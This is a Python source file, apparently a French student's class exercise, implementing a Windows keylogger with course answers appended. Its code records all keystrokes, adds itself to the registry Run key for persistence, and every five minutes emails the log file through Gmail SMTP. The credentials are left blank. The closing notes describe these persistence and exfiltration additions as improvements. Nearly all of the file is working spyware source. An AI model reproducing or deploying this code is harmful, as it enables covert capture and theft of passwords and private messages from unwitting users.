import os
import threading
from pynput.keyboard import Key, Listener
import time
import winreg
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

log = ""
path = r"C:\Users\vabla\Desktop\textlogger.txt"
script_path = r"C:\Users\vabla\Downloads\keylogger\keylogger\main.py"

# Fonction pour vérifier et créer le fichier log s'il n'existe pas
def create_log_file(path):
    if not os.path.exists(path):
        with open(path, "w") as logfile:
            logfile.write("Création du fichier de log.\n")

# Fonction pour ajouter le script au démarrage
def add_to_startup(script_path):
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
    winreg.CloseKey(key)

# Fonction pour traiter les touches pressées
def processkeys(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == Key.space:
            log += "(espace) "
        elif key == Key.enter:
            log += "(retour ligne)\n"
        elif key == Key.backspace:
            log += "(backspace)"
        else:
            log += ""

# Fonction pour envoyer le fichier log par email
def send_email():
    fromaddr = ""
    toaddr = ""
    password = ""

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Log"

    body = "Log du keylogger"
    msg.attach(MIMEText(body, 'plain'))

    attachment = open(path, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(path)}')
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

# Fonction pour écrire les logs dans le fichier
def report():
    global log, path
    while True:
        time.sleep(300)
        if log:
            with open(path, "a") as logfile:
                logfile.write(log)
            log = ""
        send_email()

# Vérifie et crée le fichier log si nécessaire
create_log_file(path)

# Ajoute le script au démarrage
add_to_startup(script_path)

# Lancement de l'écoute du clavier
keyboard_listener = Listener(on_press=processkeys)

report_thread = threading.Thread(target=report)
report_thread.daemon = True
report_thread.start()

with keyboard_listener:
    keyboard_listener.join() #Ces deux lignes garantissent que le programme attend et capture les frappes de clavier de manière continue.

"""""
Question 1 :
Un keylogger est un logiciel ou un matériel conçu pour capturer et enregistrer secrètement les frappes au clavier d'un utilisateur. Il peut être utilisé pour surveiller les mots de passe, les conversations privées et toute autre information sensible que l'utilisateur saisit sur son clavier.

Question 2 :
Sécurité en entreprise : Dans certains contextes professionnels, les entreprises peuvent utiliser des keyloggers pour surveiller l'activité de leurs employés sur les ordinateurs de l'entreprise, notamment à des fins de sécurité et de conformité.
Dépannage informatique : Les techniciens informatiques peuvent utiliser des keyloggers pour diagnostiquer des problèmes techniques sur les ordinateurs de leurs clients, en enregistrant les séquences de touches pour identifier les sources d'erreur.

Question 9 :
Les touches pressées sont affichées sur le terminal du programme.

Question 14 :
Les points faibles de ce keylogger sont :

- Il ne s'exécute pas directement au démarrage du PC.
- Il ne fonctionne qu'en local.
- Le fichier log.txt doit être créé avant que le code ne soit exécuté.

Question 15 :
J'ai modifié le code de cette façon :

- J'ai ajouté un appel aux registres du PC, en particulier à la clé Run, pour que le programme s'exécute à chaque démarrage du PC.
- J'ai opté pour l'envoi du fichier log.txt via un serveur SMTP lié à mon adresse email donc j'ai eu besoin aussi de mettre un report pour ne pas me retrouvé avec 500 mail toutes les minutes (j'ai supprimé les informations sensibles du code pour ne pas laisser de traces).
- Pour garantir le bon fonctionnement du programme, j'ai ajouté une petite fonction qui vérifie si le fichier log.txt existe ; sinon, il est simplement créé.

"""